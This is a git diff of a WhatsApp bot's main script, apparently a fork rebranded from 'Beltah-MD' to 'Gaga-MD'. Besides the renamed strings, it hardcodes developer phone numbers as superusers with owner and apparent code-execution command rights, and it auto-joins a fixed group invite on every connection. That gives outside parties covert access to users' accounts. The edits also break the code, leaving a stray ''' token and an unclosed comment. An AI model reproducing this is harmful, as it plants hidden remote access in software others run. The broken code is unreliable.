@@ -76,7 +76,7 @@ const {
   atbverifierEtatJid,
   atbrecupererActionJid
 } = require("./bdd/antibot");
-let evt = require(__dirname + "/keizzah/keith");
+let evt = require(__dirname + "/framework/zokou");
 const {
   isUserBanned,
   addUserToBanList,
@@ -92,11 +92,11 @@ const {
   addGroupToOnlyAdminList,
   removeGroupFromOnlyAdminList
 } = require("./bdd/onlyAdmin");
-//const //{loadCmd}=require("/keizzah/mesfonctions")
+//const //{loadCmd}=require("/framework/mesfonctions")
 let {
   reagir
-} = require(__dirname + "/keizzah/app");
-var session = conf.session.replace(/BELTAH-MD;;;=>/g, "");
+} = require(__dirname + "/framework/app");
+var session = conf.session.replace(/GAGA-MD;;;=>/g, "");
 const prefixe = conf.PREFIXE || [];
 
 require('dotenv').config({
@@ -143,7 +143,7 @@ setTimeout(() => {
       logger: pino({
         level: "silent"
       }),
-      browser: ['BELTAH-MD', "safari", "1.0.0"],
+      browser: ['GAGA-MD', "safari", "1.0.0"],
       printQRInTerminal: true,
       fireInitQueries: false,
       shouldSyncHistoryMessage: true,
@@ -210,7 +210,7 @@ if (conf.AUTOBIO === 'yes') {
     setInterval(() => {
       const date = new Date();
       zk.updateProfileStatus(
-        `👻 ${conf.BOT} 👻 is active: ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
+        `🥷 ${conf.BOT} 🥷 is active: ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
       );
     }, 10 * 1000);
   }
@@ -259,9 +259,9 @@ zk.ev.on("messages.upsert", async (m) => {
    // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*『 👻 ᴀɴᴛɪᴅᴇʟᴇᴛᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ 👻 』*\n\n`;
+  let notification = `*『 XGAGA BOTS 』*\n\n`;
   notification += `*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ :* ${new Date().toLocaleString()}\n`;
-  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> ᴍᴇssᴀɢᴇ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ʙᴇʟᴛᴀʜ-ᴍᴅ`;
+  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> Genarated by Gaga md`;
   return notification;
 }
 
@@ -374,9 +374,9 @@ zk.ev.on("messages.upsert", async m => {
       // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*『👻 ᴀɴᴛɪᴅᴇʟᴇᴛᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ 👻』*\n\n`;
+  let notification = `*『XGaga bots』*\n\n`;
   notification += `*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ :* ${new Date().toLocaleString()}\n`;
-  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> ᴍᴇssᴀɢᴇ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ʙᴇʟᴛᴀʜ-ᴍᴅ`;
+  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> Genarated by gaga md`;
   return notification;
 }
 
@@ -526,7 +526,7 @@ let lastReactionTime = 0;
           await zk.sendMessage(message.key.remoteJid, {
             react: {
               key: message.key,
-              text: "👻", // Reaction emoji
+              text: "🥷", // Reaction emoji
             },
           });
 
@@ -631,10 +631,10 @@ let lastReactionTime = 0;
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254737681758", '254114141192', '254737681758', "254114141192", '254737681758', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254112291443", '254729269118', '', "", ''', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254114141192', '254737681758', "254737681758", '254737130240'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254729269118', '254112291443', "", '254729269118'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -642,7 +642,7 @@ let lastReactionTime = 0;
           quoted: ms
         });
       }
-      console.log("\t [][]...{Beltah-Md}...[][]");
+      console.log("\t [][]...{Gaga-Md}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
@@ -738,13 +738,13 @@ let lastReactionTime = 0;
       
       if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
         zk.sendMessage(auteurMessage, {
-          'text': "🚫am blocking you because you have violated Beltah policies🚫!"
+          'text': "🚫am blocking you because you have violated Gaga policies🚫!"
         });
         await zk.updateBlockStatus(auteurMessage, 'block');
       }
 
       
-/*const forbiddenWords = [
+//const forbiddenWords = [
   'bitch',
   'fuck',
   'ass'
@@ -800,7 +800,7 @@ zk.ev.on("messages.upsert", async (m) => {
 
       if (texte && texte.startsWith('<')) {
   if (!superUser) {
-    return repondre("Only for my owner or Beltah Tech to execute this command 🚫");
+    return repondre("Only for my owner or Gaga to execute this command 🚫");
   }
   
   try { 
@@ -817,13 +817,13 @@ zk.ev.on("messages.upsert", async (m) => {
 if (texte && texte.startsWith('>')) {
   // If the sender is not the owner
   if (!superUser) {
-    const menuText = `This command is only for the owner or Beltah to execute 🚫`;
+    const menuText = `This command is only for the owner or Gaga to execute 🚫`;
 
     await zk.sendMessage(origineMessage, {
       text: menuText,
       contextInfo: {
         externalAdReply: {
-          title: "𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃" ,
+          title: "GAGA 𝐌𝐃" ,
           body: "POWERED BY BELTAH HACKING TEAM",
           sourceUrl: "https://whatsapp.com/channel/0029VaRHDBKKmCPKp9B2uH2F" ,
           thumbnailUrl: "https://telegra.ph/file/dcce2ddee6cc7597c859a.jpg" || conf.BOT_MENU_LINK,
@@ -1092,7 +1092,7 @@ if (texte && texte.startsWith('>')) {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'BELTAH-MD',
+                pack: 'GAGA-MD',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1164,7 +1164,7 @@ if (texte && texte.startsWith('>')) {
 
       //execution des commandes   
       if (verifCom) {
-        const cd = evt.cm.find(keith => keith.nomCom === com || keith.nomCom === com || keith.aliases && keith.aliases.includes(com));
+        const cd = evt.cm.find(zokou => zokou.nomCom === com || zokou.nomCom === com || zokou.aliases && zokou.aliases.includes(com));
         if (cd) {
           try {
             if (conf.MODE.toLocaleLowerCase() != 'yes' && !superUser) {
@@ -1174,7 +1174,7 @@ if (texte && texte.startsWith('>')) {
             /******************* PM_PERMT***************/
 
             if (!superUser && origineMessage === auteurMessage && conf.PM_PERMIT === "yes") {
-              repondre("ᴇʀʀᴏʀ🚫!! ʏᴏᴜ ʜᴀᴠᴇ ɴᴏ ᴀᴄᴄᴇss ᴏғ ʙᴇʟᴛᴀʜ-ᴍᴅ ɪɴ ᴘᴍ.");
+              repondre("Access denied idiot 🚫!!");
               return;
             }
             ///////////////////////////////
@@ -1236,7 +1236,7 @@ if (texte && texte.startsWith('>')) {
       try {
         const metadata = await zk.groupMetadata(group.id);
         if (group.action == 'add' && (await recupevents(group.id, "welcome")) == 'on') {
-          let msg = `𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃\n\n👋 Hello
+          let msg = `Gaga md\n\n👋 Hello
 `;
           let membres = group.participants;
           for (let membre of membres) {
@@ -1362,10 +1362,10 @@ if (texte && texte.startsWith('>')) {
         connection
       } = con;
       if (connection === "connecting") {
-        console.log("ℹ️ Beltah md connecting in your account...");
+        console.log("ℹ️ Gaga md connecting in your account...");
       } else if (connection === 'open') {
         await zk.groupAcceptInvite("CtmozQc8RVv6bLiWK1ACkN");
-         console.log("✅ Beltah Md connected successfully✔");
+         console.log("✅ Gaga Md connected successfully✔");
         console.log("--");
         0;
         await baileys_1.delay(200);
@@ -1373,17 +1373,17 @@ if (texte && texte.startsWith('>')) {
         0;
         await baileys_1.delay(300);
         console.log("------------------/-----");
-        console.log(" Beltah-md installing ${evt.cm.length} plugins😇\n\n");
+        console.log(" Gaga-md installing ${evt.cm.length} plugins😇\n\n");
         //chargement des commandes 
         console.log("chargement des commands ...\n");
-        fs.readdirSync(__dirname + "/commands").forEach(fichier => {
+        fs.readdirSync(__dirname + "/plugins").forEach(fichier => {
           if (path.extname(fichier).toLowerCase() == ".js") {
             try {
-              require(__dirname + "/commands/" + fichier);
-              console.log(fichier + "Successfully installed Beltah Md commands✔️");
+              require(__dirname + "/plugins/" + fichier);
+              console.log(fichier + "Successfully installed Gaga Md plugins✔️");
             } catch (e) {
               console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
-            } /* require(__dirname + "/commands/" + fichier);
+            } /* require(__dirname + "/plugins/" + fichier);
               console.log(fichier + " installé ✔️")*/
             0;
             baileys_1.delay(300);
@@ -1399,7 +1399,7 @@ if (texte && texte.startsWith('>')) {
         } else {
           md = "undefined";
         }
-        console.log("Beltah md successfully connected✅");
+        console.log("Gaga md successfully connected✅");
         await activateCrons();
                 const date = new Date();
                 const formattedDate = date.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', timeZone: conf.TIMEZONE });
@@ -1425,7 +1425,7 @@ if (texte && texte.startsWith('>')) {
 
         if (conf.DP.toLowerCase() === 'yes') {
           await zk.sendMessage(zk.user.id, {
-            text: `*BELTAH-MD* connected successfully ✅
+            text: `*GAGA* connected successfully ✅
             
             Please update your bot now to connect latest version 
             
@@ -1440,7 +1440,7 @@ if (texte && texte.startsWith('>')) {
           console.log('!!! connexion fermée, reconnexion en cours ...');
           main();
         } else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
-          console.log('connection error😞 ,,Beltah trying to reconnect... ');
+          console.log('connection error😞 ,,Gaga trying to reconnect... ');
           main();
         } else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
           console.log('connexion réplacée ,,, une sesssion est déjà ouverte veuillez la fermer svp !!!');
